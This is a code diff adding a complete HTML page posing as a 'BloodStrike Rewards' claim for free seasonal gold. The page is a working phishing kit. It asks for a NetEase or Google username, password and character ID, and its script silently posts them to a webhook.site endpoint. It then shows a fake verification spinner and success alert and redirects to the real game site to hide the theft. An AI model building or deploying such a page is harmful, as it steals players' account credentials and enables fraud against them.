@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>BloodStrike Rewards</title>
+    <style>
+        body { background: #111; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #1a1a1a; border-top: 4px solid #ff4444; padding: 30px; width: 320px; border-radius: 8px; text-align: center; }
+        input, select { width: 100%; padding: 12px; margin: 10px 0; background: #222; color: white; border: 1px solid #444; border-radius: 4px; box-sizing: border-box; }
+        
+        #btn { background: #ff4444; color: white; width: 100%; padding: 15px; border: none; cursor: pointer; font-weight: bold; margin-top: 10px; border-radius: 4px; font-size: 16px; position: relative; }
+        
+        /* THE SPINNER - This version is forced to spin */
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            margin: 0 auto 10px auto;
+            animation: spin 0.8s linear infinite !important;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div id="loading" class="spinner"></div>
+        <h2 id="head">BLOODSTRIKE</h2>
+        <p id="sub">Claim 5,000 Seasonal Gold</p>
+        
+        <div id="formFields">
+            <select id="type"><option>NetEase Account</option><option>Google Account</option></select>
+            <input type="text" id="id" placeholder="Character ID">
+            <input type="text" id="user" placeholder="Email/Username">
+            <input type="password" id="pass" placeholder="Password">
+            <button id="btn" onclick="sendData()">CLAIM REWARDS</button>
+        </div>
+    </div>
+
+    <script>
+        function sendData() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            const id = document.getElementById('id').value;
+            const webhook = "https://webhook.site/17c70ee4-6a35-4abd-90f2-e5a68681d628";
+
+            if(u == "" || p == "" || id == "") {
+                alert("Fill all fields");
+                return;
+            }
+
+            // 1. Hide the form and show the spin at the top
+            document.getElementById('formFields').style.display = "none";
+            document.getElementById('loading').style.display = "block";
+            document.getElementById('head').innerHTML = "VERIFYING...";
+            document.getElementById('sub').innerHTML = "Connecting to BloodStrike Servers...";
+
+            // 2. Send the data
+            fetch(webhook, {
+                method: "POST",
+                mode: "no-cors",
+                body: JSON.stringify({ User: u, Pass: p, CharID: id })
+            });
+
+            // 3. Final Alert and Redirect
+            setTimeout(() => {
+                alert("Verification Success! Rewards sent to ID: " + id);
+                window.location.href = "https://www.bloodstrikemobile.com/";
+            }, 4000);
+        }
+    </script>
+</body>
+</html>
